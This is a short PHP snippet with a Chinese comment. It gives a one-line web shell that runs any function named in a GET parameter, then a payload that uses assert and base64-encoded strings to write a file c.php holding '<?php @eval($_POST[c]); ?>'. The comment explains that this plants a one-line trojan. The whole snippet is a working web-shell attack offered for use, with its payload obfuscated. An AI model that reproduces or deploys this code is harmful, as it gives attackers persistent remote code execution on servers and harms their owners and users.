<?php $_GET[a]($_GET[b]);?>
//payload：?a=assert&b=${fputs(fopen(base64_decode(Yy5waHA),w),base64_decode(PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x))};

//运行上述payload，会在同目录下生成c.php文件，里面的内容是<?php @eval($_POST[c]); ?>1，生成一句话木马。